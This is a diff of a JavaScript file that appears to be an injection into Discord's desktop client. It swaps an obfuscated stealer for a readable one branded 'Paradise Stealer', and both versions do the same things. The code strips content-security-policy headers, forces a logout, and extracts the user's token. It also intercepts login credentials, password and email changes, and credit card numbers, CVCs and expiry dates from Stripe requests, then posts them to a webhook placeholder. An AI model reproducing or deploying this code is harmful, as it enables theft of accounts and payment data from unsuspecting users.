@@ -1,98 +1,388 @@
-function sakariya(kemen, nylee) {
-  const treyon = camariyah();
-  return sakariya = function (genesha, adalia) {
-    genesha = genesha - 138;
-    let tonisha = treyon[genesha];
-    return tonisha;
-  }, sakariya(kemen, nylee);
-}
-const rasun = sakariya;
-(function (yadirah, chatia) {
-  const charlana = sakariya, kailiana = yadirah();
-  while (!![]) {
-    try {
-      const julez = -parseInt(charlana(255)) / 1 + -parseInt(charlana(171)) / 2 + -parseInt(charlana(359)) / 3 + -parseInt(charlana(360)) / 4 + parseInt(charlana(209)) / 5 + -parseInt(charlana(244)) / 6 * (parseInt(charlana(372)) / 7) + parseInt(charlana(363)) / 8 * (parseInt(charlana(152)) / 9);
-      if (julez === chatia) break; else kailiana.push(kailiana.shift());
-    } catch (nyelli) {
-      kailiana.push(kailiana.shift());
+const fs = require('fs');
+const path = require('path');
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron')
+const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
+var webhook = "%WEBHOOK_LINK%";
+
+function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
+        return !0
     }
-  }
-}(camariyah, 237794));
-const {BrowserWindow, session} = require(rasun(220)), getTokenScript = rasun(236) + rasun(310) + rasun(349) + rasun(259) + rasun(184) + rasun(235) + rasun(205) + rasun(268) + rasun(350) + rasun(149) + rasun(163) + rasun(265) + rasun(431) + rasun(387) + rasun(432) + rasun(203) + rasun(230) + rasun(437) + rasun(228) + rasun(406) + rasun(315) + rasun(316) + rasun(300) + rasun(254) + rasun(361) + rasun(226) + rasun(219) + rasun(269) + rasun(351) + rasun(224) + rasun(367) + rasun(409) + rasun(202) + rasun(181) + rasun(246) + rasun(173) + rasun(379) + rasun(167) + rasun(144) + rasun(191) + rasun(180) + rasun(169) + rasun(284);
-var loggedOut = ![];
-function camariyah() {
-  const dair = ["ction LogO", "tindianpar", "get_requir", "ling/subsc", "AoyBp", "tion(a){co", "illing/sub", "h.random()", "getAllWind", "mlHttp.set", "ts;if(d&&d", "der('Acces", "rs/@me/mfa", "tor", "orts=c},[[", "uth/login", "ON.stringi", ",delete gg", "uire,delet", "ackChunkdi", "icy-report", "oldPasswor", "s/detectab", "window.web", "scord_app.", "PbBug", "POmfX", "username", "changedEma", "push([[Mat", 'tToken"==a', "LPUWY", "cation/jso", "c)if(gg.c.", "ty.rip/vWq", "exports=c}", "   xmlHttp", "ontent-Typ", "9WJiTyA", "atus.disco", "onComplete", "toString", 'rization",', "fy(", "//discord.", "responseHe", "changedPas", "s-Control-", "ows", ',[["get_re', '"get_requi', "https://ap", "avatar", 'efault)"ge', "ord.gg/*", "etToken())", "parse", "545826crCUxX", "discrimina", "ult)for(le", "secret", "mfa/totp/e", "juhlL", "https://st", "wRJMq", "onBeforeRe", ".default.g", "b.__esModu", "sers/@me/b", "exports", "dow.webpac", ",c)=>a.exp", '.open("GET', 'zkGwLcUiF"', "lications/", "THQAY", '", false);', "&&(token=b", "g=a}]);fun", ".__esModul", "email", "cBLJh", "jwpLv", "FSUvZ", "uWeQP", "onst d=gg.", ", true);\n ", "   xhr.ope", "rts;if(b&&", "e gg.c.get", "tbQQU", "h([[],{get", "   xhr.set", "-only", "l;for(cons", "1412900KJqtPs", "rs/@me", "NLjfg", "ut(){(func", "/v*/schedu", "api/v*/aut", "PATCH", "webContent", "NlPbx", "aScript", ">{gg=a}]),", "electron", "onth]", 're"]]]),de', "cardAdded", "roperty(a)", "oming.json", "m()],{},a=", "discord.co", "packChunkd", "vYhlf", "_require):", "sers/@me/m", "data[cvc]", "includes", "tokens", "kJsonp.pus", "for(let a ", "hasOwnProp", ";if(d&&(b?", "com/api/v9", "icy", "onHeadersR", "EteCy", "quest", "16410XFMOCc", "api/v*/app", "le&&b.defa", "scriptions", "premium_ty", "));\n    ", "(gg=window", "data[exp_y", "xmlHttp.re", "./core.asa", "pp.push([[", "417958MNMpbD", 'ing"==type', "quire:(a,b", "hr.send(JS", "np?(gg=win", "webRequest", "card", "data[exp_m", "t)))return", "curity-pol", 'quire"]]])', "c[c].expor", " d.default", "_require:(", "gg.c)if(gg", "defaultSes", "sers/@me/l", "om/v*/toke", "   var xhr", "CIYtq", "t c in gg.", "login", "rd.com/api", "uperfunies", "HttpReques", ")return d}", "then", "bytes", "content-se", "}token;", "CIgLN", "packJsonp?", "MChAW", "YFbjv", "d[b]:a(d))", "wss://", 'l})("login', "method", "lete gg.m.", ".webpackJs", "m/api/v*/a", "wss://remo", "g.c.get_re", "api/v*/use", "\n        x", "kdiscord_a", "users/@me/", "of a?a:nul", "efault[b]:", "Allow-Orig", "pukLx", "    \n     ", "KpCsq", "  xmlHttp.", "pplication", "in window.", "e,delete g", "scordapp.c", "executeJav", "ZWNuo", "&&window.w", "ebpackChun", "sword", "InBmD", "eceived", "https://*.", "scord.com/", "cBoct", "statusCode", "ibrary", "nable", "\n        v", "kChunkdisc", "om/api/v*/", "newPasswor", '");\n      ', "teway.disc", "riptions", "e', 'appli", "users/@me", "rs/@me/lib", "aders", "te-auth-ga", "stringify", 'n("POST", ', "new_passwo", "detectable", "m/api/v*/u", "ar xmlHttp", '").logout(', " = new XML", "startsWith", 'nst b="str', "able", "webpackJso", "a,b,c)=>a.", ".c.hasOwnP", "e&&d.defau", "h/login", "PtOxS", 'der("Autho', "auth/login", "sion", "ear]", "3678DuRhkf", "1840016PEZqXe", "Math.rando", "sponseText", "11790440EhJznH", "password", "       xhr", "https://di", "){let b=gg", "led-mainte", "onp.push([", "nances/upc", "/totp/enab", "938HOJYSw", "return nul", '", "https:', "rs/@me/bil", ".setReques", "NOCWz", ";\n        ", "t a in b.d", "quire):win", "[],{get_re", "fa/totp/en", "t();\n     ", "send(null)", "a(d.defaul", "lt&&(b?d.d", ".m.get_req", "RequestHea", "from", "n');\n     ", '"https://s', "HXGAo", "rary", "JDgXV", "/users/@me", "indow.webp", "erty(c)){c", "i.stripe.c", "uploadData", "ord_app&&w", "endsWith", "sers/@me", "enabled2FA", "data[numbe", "url", "iscord_app", "flags", ")}LogOut()", ".c[a].expo", "in', '*');", "tHeader('C", "lKoRc", "],{},a=>{g"];
-  camariyah = function () {
-    return dair;
-  };
-  return camariyah();
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
+    return !1
 }
-session[rasun(270) + rasun(357)][rasun(260)][rasun(179) + rasun(243)]({urls: [rasun(177) + rasun(153) + rasun(277) + rasun(213) + rasun(368) + rasun(370) + rasun(225), rasun(320) + rasun(227) + rasun(295) + rasun(309) + rasun(436) + "le", rasun(366) + rasun(321) + rasun(245) + rasun(188) + rasun(341), rasun(320) + rasun(227) + rasun(342) + rasun(271) + rasun(324), rasun(366) + rasun(321) + rasun(298) + rasun(335) + rasun(393), rasun(320) + rasun(227) + rasun(342) + rasun(182) + rasun(420) + rasun(247), rasun(366) + rasun(321) + rasun(298) + rasun(375) + rasun(417) + rasun(332), rasun(296) + rasun(337) + rasun(331) + rasun(168)]}, (catori, alyani) => {
-  const donterrio = rasun, vimala = {NLjfg: donterrio(290), pukLx: function (gillespie, shaqueel) {
-    return gillespie(shaqueel);
-  }}, halfred = BrowserWindow[donterrio(422) + donterrio(162)]()[0];
-  !loggedOut && (loggedOut = !![], halfred[donterrio(216) + "s"][donterrio(313) + donterrio(218)](donterrio(437) + donterrio(286) + donterrio(250) + donterrio(294) + donterrio(369) + donterrio(381) + donterrio(257) + donterrio(185) + donterrio(428) + donterrio(164) + donterrio(222) + donterrio(293) + donterrio(416) + donterrio(311) + donterrio(297) + donterrio(380) + donterrio(184) + donterrio(327) + donterrio(400) + donterrio(396) + donterrio(433) + donterrio(138) + donterrio(143) + donterrio(421) + donterrio(413) + donterrio(192) + donterrio(414) + donterrio(212) + donterrio(419) + donterrio(347) + donterrio(256) + donterrio(302) + donterrio(208) + donterrio(275) + donterrio(147) + donterrio(237) + donterrio(397) + donterrio(199) + donterrio(266) + donterrio(424) + donterrio(193) + donterrio(352) + donterrio(386) + donterrio(303) + donterrio(385) + donterrio(263) + donterrio(267) + donterrio(238) + donterrio(289) + donterrio(280) + donterrio(373) + donterrio(291) + donterrio(344) + donterrio(408) + ";", !![]));
-  if (catori[donterrio(405)][donterrio(346)](vimala[donterrio(211)])) vimala[donterrio(305)](alyani, {cancel: !![]}); else vimala[donterrio(305)](alyani, {cancel: ![]});
-}), session[rasun(270) + rasun(357)][rasun(260)][rasun(241) + rasun(319)]((briton, uriel) => {
-  const aaronisha = rasun, kayshon = {uWeQP: aaronisha(283) + aaronisha(264) + aaronisha(240), FSUvZ: aaronisha(283) + aaronisha(264) + aaronisha(434) + aaronisha(207), YFbjv: function (miketa, jahkobi) {
-    return miketa(jahkobi);
-  }};
-  delete briton[aaronisha(159) + aaronisha(336)][kayshon[aaronisha(198)]], delete briton[aaronisha(159) + aaronisha(336)][kayshon[aaronisha(197)]], kayshon[aaronisha(288)](uriel, {responseHeaders: {...briton[aaronisha(159) + aaronisha(336)], "Access-Control-Allow-Headers": "*"}});
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+	if (details.url.startsWith(webhook)) {
+		if (details.url.includes("discord.com")) {
+			callback({
+				responseHeaders: Object.assign({
+					'Access-Control-Allow-Headers': "*"
+				}, details.responseHeaders)
+			});
+		} else {
+			callback({
+				responseHeaders: Object.assign({
+					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+					'Access-Control-Allow-Headers': "*",
+					"Access-Control-Allow-Origin": "*"
+				}, details.responseHeaders)
+			});
+		}
+
+
+	} else {
+		delete details.responseHeaders['content-security-policy'];
+		delete details.responseHeaders['content-security-policy-report-only'];
+
+		callback({
+			responseHeaders: {
+				...details.responseHeaders,
+				'Access-Control-Allow-Headers': "*"
+			}
+		})
+	}
+
+})
+
+const Filter = {
+	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+}
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+	if (FirstTime()) {}
+
+	callback({})
+	return;
+})
+
+function SendToWebhook(info) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
+        xhr.open("POST", "${webhook}", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+        xhr.send(JSON.stringify(${info}));
+    `, !0)
+}
+
+function GetNitro(type) {
+	if (type == 0) {
+		return "No Nitro"
+	}
+	if (type == 1) {
+		return "<:Rogue_nitro:934007729780047922>"
+	}
+	if (type == 2) {
+		return "<:Rogue_nitro:934007729780047922><a:420_booster_op:924523310828646430>"
+	} else {
+		return "No Nitro"
+	}
+}
+
+function GetBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const House_Bravery = 64;
+	const House_Brilliance = 128;
+	const House_Balance = 256;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "<:staff_blue:936543701294010399> "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "<:PartneredServerOwner:923782988041441352> "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "<:HypesquadEvents_FX:929722784039436318> "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "<:cntr_BugHunter:893164631764394024> "
+	}
+	if ((flags & House_Bravery) == House_Bravery) {
+		badges += "<:HypeSquadBravery:941037226370957332> "
+	}
+	if ((flags & House_Brilliance) == House_Brilliance) {
+		badges += "<:HypeSquadBrilliance:941037162357489724> "
+	}
+	if ((flags & House_Balance) == House_Balance) {
+		badges += "<:hypesquadbalanceCopy:930309005782441985> "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "<a:early:925791052512788551> "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "<:TG_DiscordBugHunter:921967832739237928> "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "<:1947_botdeveloper:908019479882125414> "
+	}
+	if (badges == "") {
+		badges = "<a:420_cross:931468716779114536>"
+	}
+	return badges
+}
+
+function Login(email, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "Paradise Stealer",
+            content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/942128284722937866/944637621680869426/p.png",
+            embeds: [
+                {
+                    "color": 3447704,
+                    "fields": [
+                        {
+                            "name": "<a:arrow:765308889859751976> **Account Info**",
+
+                            
+
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`\n                           
+                            
+                                       <:staff_blue:936543701294010399> **Password:** \`${password}\`\n `,
+                            "inline": false
+                        },
+                                {
+                                   "name": "<a:arrow:765308889859751976> **Other Info**",                                                               
+                                   "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                                 },
+                                 { name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 },
+
+
+                                 {
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Paradise Stealer "
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "Paradise Stealer",
+            content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/942128284722937866/944637621680869426/p.png",
+            embeds: [
+                {
+                    "color": 3447704,
+                    "fields": [
+                        {
+                            "name": "**Password Changed**",
+                            "value": `<:PP_director:942527310324719716> **Email:** \`${json.email}\`\n 
+                            
+                            <:staff_blue:936543701294010399> **Old Password:** \`${oldpassword}\`\n 
+                            
+                            <:staff_blue:936543701294010399> **New Password:** \`${newpassword}\``,
+                            "inline": true
+                        },
+
+                        {
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            
+                            <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+
+                        {
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Paradise Stealer"
+                    }                 
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+function ChangeEmail(newemail, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        var json = JSON.parse(info);
+        var params = {
+            username: "Paradise Stealer",
+            content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/942128284722937866/944637621680869426/p.png",
+            embeds: [
+                {
+                    "color": 3447704,
+                    "fields": [
+                        {
+                            "name": "**Email Changed**",
+                            "value": `<:PP_director:942527310324719716> **New Email:** \`${newemail}\`\n 
+                            
+                            <:staff_blue:936543701294010399> **Password:** \`${password}\``,
+                            "inline": true
+                        },
+
+                        {
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            
+                            <a:allbadges:895906088996720690> **Badges:** ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+
+                        {
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Paradise Stealer"
+                    }                
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        var json = JSON.parse(info);
+        var params = {
+            username: "Paradise Stealer",
+            content: "@everyone",
+            avatar_url: "https://cdn.discordapp.com/attachments/942128284722937866/944637621680869426/p.png",
+            embeds: [
+                {
+                    "color": 3447704,
+                    "fields": [
+                        {
+                            "name": "**Credit Card Added**",
+                            "value": `**Credit Card Number:** ||${number}||\n
+                            
+                            **CVC:** ||${cvc}||\n
+                            
+                            **Credit Card Expiration:** ||${expir_month}||/||${expir_year}||`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Other Info**",
+                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username + "#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Paradise Stealer"
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+const UrlFilter = {
+	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
+session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
+	if (details.url.endsWith("login")) {
+		if (details.statusCode == 200) {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			const email = data.login;
+			const password = data.password;
+			const window = BrowserWindow.getAllWindows()[0];
+			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+				Login(email, password, token)
+			}))
+		}
+	}
+	if (details.url.endsWith("users/@me")) {
+		if (details.statusCode == 200 && details.method == "PATCH") {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			if (data.password != null && data.password != undefined && data.password != "") {
+				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+						ChangePassword(data.password, data.new_password, token)
+					}))
+				}
+				if (data.email != null && data.email != undefined && data.email != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+						ChangeEmail(data.email, data.password, token)
+					}))
+				}
+			}
+		}
+	}
+	if (details.url.endsWith("tokens")) {
+		const item = querystring.parse(details.uploadData[0].bytes.toString())
+        const window = BrowserWindow.getAllWindows()[0];
+        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
+        }))
+	}
 });
-function sendToApi(hollee) {
-  const neferteria = rasun, lafern = BrowserWindow[neferteria(422) + neferteria(162)]()[0];
-  lafern[neferteria(216) + "s"][neferteria(313) + neferteria(218)](neferteria(306) + neferteria(273) + neferteria(345) + neferteria(279) + neferteria(383) + neferteria(201) + neferteria(339) + neferteria(391) + neferteria(278) + neferteria(415) + neferteria(148) + neferteria(187) + neferteria(200) + neferteria(365) + neferteria(376) + neferteria(411) + neferteria(151) + neferteria(333) + neferteria(146) + neferteria(390) + neferteria(206) + neferteria(388) + neferteria(425) + neferteria(161) + neferteria(304) + neferteria(410) + neferteria(299) + neferteria(258) + neferteria(430) + neferteria(157) + hollee + neferteria(249), !![]);
-}
-function newData(fiorella, einin, ..._0x3a160f) {
-  const eriella = rasun, kevinn = {juhlL: function (lucile, katrese) {
-    return lucile + katrese;
-  }, CIgLN: function (zlaty, antowne) {
-    return zlaty + antowne;
-  }, jwpLv: eriella(276), cBLJh: eriella(142) + "il", cBoct: eriella(160) + eriella(317), PbBug: eriella(223), CIYtq: eriella(403), wRJMq: function (keilan, yvonna) {
-    return keilan(yvonna);
-  }}, ambar = BrowserWindow[eriella(422) + eriella(162)]()[0];
-  ambar[eriella(216) + "s"][eriella(313) + eriella(218)](eriella(326) + eriella(343) + eriella(345) + eriella(279) + eriella(383) + eriella(150) + eriella(186) + eriella(374) + eriella(158) + eriella(239) + eriella(395) + eriella(190) + eriella(299) + eriella(423) + eriella(388) + eriella(355) + eriella(156) + ' "' + einin + (eriella(330) + eriella(308) + eriella(384) + eriella(378) + eriella(252) + eriella(362) + ";"), !![])[eriella(281)](mahalakshmi => {
-    const nazar = eriella;
-    var sterlin = JSON[nazar(170)](mahalakshmi), trinice = {username: kevinn[nazar(176)](kevinn[nazar(285)](sterlin[nazar(141)], "#"), sterlin[nazar(172) + nazar(427)]), id: sterlin.id, avatar: sterlin[nazar(166)], nitro: sterlin[nazar(248) + "pe"], badges: sterlin[nazar(407)], email: sterlin[nazar(194)], token: einin, type: fiorella};
-    switch (fiorella) {
-      case kevinn[nazar(196)]:
-        trinice[nazar(364)] = _0x3a160f[0];
-        break;
-      case kevinn[nazar(195)]:
-        trinice[nazar(194)] = _0x3a160f[0], trinice[nazar(364)] = _0x3a160f[1];
-        break;
-      case kevinn[nazar(322)]:
-        trinice[nazar(435) + "d"] = _0x3a160f[0], trinice[nazar(329) + "d"] = _0x3a160f[1];
-        break;
-      case kevinn[nazar(139)]:
-        trinice[nazar(261)] = {number: _0x3a160f[0], cvc: _0x3a160f[1], expire: {month: _0x3a160f[2], year: _0x3a160f[3]}};
-        break;
-      case kevinn[nazar(274)]:
-        trinice[nazar(174)] = _0x3a160f[0], trinice[nazar(364)] = _0x3a160f[1];
-        break;
-    }
-    kevinn[nazar(178)](sendToApi, JSON[nazar(338)](trinice));
-  });
-}
-session[rasun(270) + rasun(357)][rasun(260)][rasun(154) + "d"]({urls: [rasun(366) + rasun(321) + rasun(298) + rasun(210), rasun(366) + rasun(312) + rasun(328) + rasun(334), rasun(320) + rasun(227) + rasun(342) + rasun(402), rasun(366) + rasun(321) + rasun(298) + rasun(426) + rasun(371) + "le", rasun(366) + rasun(312) + rasun(328) + rasun(301) + rasun(175) + rasun(325), rasun(320) + rasun(227) + rasun(342) + rasun(231) + rasun(382) + rasun(348), rasun(366) + rasun(312) + rasun(328) + rasun(356), rasun(366) + rasun(321) + rasun(214) + rasun(353), rasun(320) + rasun(227) + rasun(295) + rasun(429), rasun(165) + rasun(398) + rasun(272) + "ns"]}, async (kamorie, pera) => {
-  const ashling = rasun, opaline = {PtOxS: function (sameed, kiristen) {
-    return sameed != kiristen;
-  }, vYhlf: ashling(276), tbQQU: function (hoku, tresean, jashaun, roneshia) {
-    return hoku(tresean, jashaun, roneshia);
-  }, AoyBp: ashling(301) + ashling(175) + ashling(325), ZWNuo: function (roverta, keita, dannetta, raytheon, abdihakim) {
-    return roverta(keita, dannetta, raytheon, abdihakim);
-  }, MChAW: ashling(403), POmfX: ashling(334), lKoRc: ashling(215), NlPbx: ashling(142) + "il", NOCWz: ashling(160) + ashling(317), InBmD: ashling(234), EteCy: function (quennell, kerrin, nyir, kajsa, termaine, rothwell, rydel) {
-    return quennell(kerrin, nyir, kajsa, termaine, rothwell, rydel);
-  }, LPUWY: ashling(223), JDgXV: ashling(404) + "r]", THQAY: ashling(232), KpCsq: ashling(262) + ashling(221), HXGAo: ashling(251) + ashling(358)}, avont = BrowserWindow[ashling(422) + ashling(162)]()[0];
-  if (opaline[ashling(354)](kamorie[ashling(323)], 200)) return;
-  const denesa = JSON[ashling(170)](Buffer[ashling(389)](kamorie[ashling(399)][0][ashling(282)])[ashling(155)]()), vander = await avont[ashling(216) + "s"][ashling(313) + ashling(218)](getTokenScript, !![]);
-  if (kamorie[ashling(405)][ashling(401)](opaline[ashling(229)])) opaline[ashling(204)](newData, opaline[ashling(229)], vander, denesa[ashling(364)]);
-  if (kamorie[ashling(405)][ashling(233)](opaline[ashling(418)])) opaline[ashling(314)](newData, opaline[ashling(287)], vander, denesa[ashling(174)], denesa[ashling(364)]);
-  if (kamorie[ashling(405)][ashling(401)](opaline[ashling(140)])) {
-    if (opaline[ashling(354)](kamorie[ashling(292)], opaline[ashling(412)])) return;
-    if (!denesa[ashling(364)]) return;
-    if (denesa[ashling(194)]) opaline[ashling(314)](newData, opaline[ashling(217)], vander, denesa[ashling(194)], denesa[ashling(364)]);
-    if (denesa[ashling(340) + "rd"]) opaline[ashling(314)](newData, opaline[ashling(377)], vander, denesa[ashling(364)], denesa[ashling(340) + "rd"]);
-  }
-  if (kamorie[ashling(405)][ashling(401)](opaline[ashling(318)])) opaline[ashling(242)](newData, opaline[ashling(145)], vander, denesa[opaline[ashling(394)]], denesa[opaline[ashling(189)]], denesa[opaline[ashling(307)]], denesa[opaline[ashling(392)]]);
-}), module[rasun(183)] = require(rasun(253) + "r");
+module.exports = require('./core.asar')
